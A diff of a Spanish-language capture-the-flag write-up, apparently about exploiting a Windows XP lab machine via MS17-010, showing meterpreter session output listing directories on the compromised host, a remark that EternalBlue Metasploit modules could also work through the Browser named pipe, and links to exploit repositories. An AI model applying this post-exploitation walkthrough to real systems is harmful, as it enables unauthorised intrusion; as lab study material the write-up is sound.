@@ -660,13 +735,14 @@ Meterpreter     : x86/windows
 meterpreter > pwd
 C:\WINDOWS\system32
 ```
-Solo es cosa de buscar los mismos directorios donde están las flags y otra vez vulneramos la máquina:
-```
+
+* Solo es cosa de buscar los mismos directorios donde están las flags y otra vez, hemos vulnerado la máquina:
+```bash
 meterpreter > cd C:\\
 meterpreter > ls
 Listing: C:\
 ============
-
+.
 Mode              Size    Type  Last modified              Name
 ----              ----    ----  -------------              ----
 100777/rwxrwxrwx  0       fil   2017-03-15 23:30:44 -0600  AUTOEXEC.BAT
@@ -684,12 +760,12 @@ Mode              Size    Type  Last modified              Name
 100444/r--r--r--  250048  fil   2008-04-13 17:01:44 -0500  ntldr
 000000/---------  0       fif   1969-12-31 18:00:00 -0600  pagefile.sys
 100666/rw-rw-rw-  0       fil   2023-04-01 17:43:46 -0600  pwned.txt
-
+.
 meterpreter > cd "Documents and Settings"
 meterpreter > ls
 Listing: C:\Documents and Settings
 ==================================
-
+.
 Mode              Size  Type  Last modified              Name
 ----              ----  ----  -------------              ----
 040777/rwxrwxrwx  0     dir   2017-03-16 00:07:21 -0600  Administrator
@@ -699,7 +775,7 @@ Mode              Size  Type  Last modified              Name
 040777/rwxrwxrwx  0     dir   2017-03-15 23:32:43 -0600  NetworkService
 040777/rwxrwxrwx  0     dir   2017-03-15 23:33:42 -0600  john
 ```
-Bien podríamos probar los Exploits del **Eternal Blue** que son exclusivos de Metasploit, por lo que pueden intentarlo solamente chequen que cumpla con los requisitos, que en este caso es que se trate de conectar por el **named pipe Browser**.
+Bien podríamos probar los Exploits del **Eternal Blue** que son exclusivos de **Metasploit**, por lo que pueden intentarlo. Solamente chequen que cumpla con los requisitos, que en este caso es que se trate de conectar por el **named pipe Browser**.
 
 
 <br>
@@ -718,8 +794,8 @@ Bien podríamos probar los Exploits del **Eternal Blue** que son exclusivos de M
 * https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/
 * https://github.com/helviojunior/MS17-010
 * https://www.google.com/search?q=named+pipe+browser&client=firefox-b-e&ei=3gciZLTqDYbCkPIPt9y5uAY&oq=named+pipes+browser&gs_lcp=Cgxnd3Mtd2l6L>
-* https://www.youtube.com/watch?v=RuWkPH_Vecg
-* https://www.youtube.com/watch?v=uV6WNOfP8s8
+* https://malwaretips.com/blogs/browser-exe-what-it-is-should-i-remove-it/
+* https://www.processlibrary.com/es/directory/files/spoolss/24800/
 
 <br>
 # FIN
